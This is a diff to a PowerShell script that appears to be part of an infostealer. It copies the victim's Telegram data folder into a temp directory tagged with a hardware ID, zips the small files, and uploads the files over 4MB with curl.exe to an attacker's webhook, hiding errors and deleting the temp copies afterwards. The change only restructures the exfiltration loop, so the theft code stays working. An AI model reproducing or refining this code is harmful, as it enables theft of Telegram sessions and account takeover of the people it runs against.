@@ -75,23 +75,21 @@ if (Test-Path $tgPath) {
     Copy-Item -Path "$tgPath\*" -Destination $tgDir -Recurse -Force -ErrorAction SilentlyContinue
     $tgFiles = Get-ChildItem -Path $tgDir -Recurse -File
     $smallFiles = @()
-    $bigFiles = @()
     foreach ($tf in $tgFiles) {
         if ($tf.Length -le 4MB) {
             $smallFiles += $tf
         } else {
-            $bigFiles += $tf
+            $tempFile = "$env:TEMP\$($tf.Name)"
+            Copy-Item -Path $tf.FullName -Destination $tempFile -Force -ErrorAction SilentlyContinue
+            curl.exe -s -F "file=@$tempFile" $webhook
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
         }
     }
     if ($smallFiles.Count -gt 0) {
         $smallDir = "$env:TEMP\Telegram_small_$hwid"
         New-Item -Path $smallDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
         foreach ($sf in $smallFiles) {
-            $relPath = $sf.FullName.Substring($tgDir.Length + 1)
-            $destFile = Join-Path $smallDir $relPath
-            $destDir = Split-Path $destFile -Parent
-            if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
-            Copy-Item -Path $sf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+            Copy-Item -Path $sf.FullName -Destination $smallDir -Force -ErrorAction SilentlyContinue
         }
         $smallZip = "$env:TEMP\Telegram_${hwid}_small.zip"
         try {
@@ -102,12 +100,6 @@ if (Test-Path $tgPath) {
         }
         Remove-Item $smallZip -Force -ErrorAction SilentlyContinue
         Remove-Item $smallDir -Recurse -Force -ErrorAction SilentlyContinue
-    }
-    foreach ($bf in $bigFiles) {
-        $tempFile = "$env:TEMP\$($bf.Name)"
-        Copy-Item -Path $bf.FullName -Destination $tempFile -Force -ErrorAction SilentlyContinue
-        curl.exe -s -F "file=@$tempFile" $webhook
-        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
     }
     Remove-Item $tgDir -Recurse -Force -ErrorAction SilentlyContinue
 }
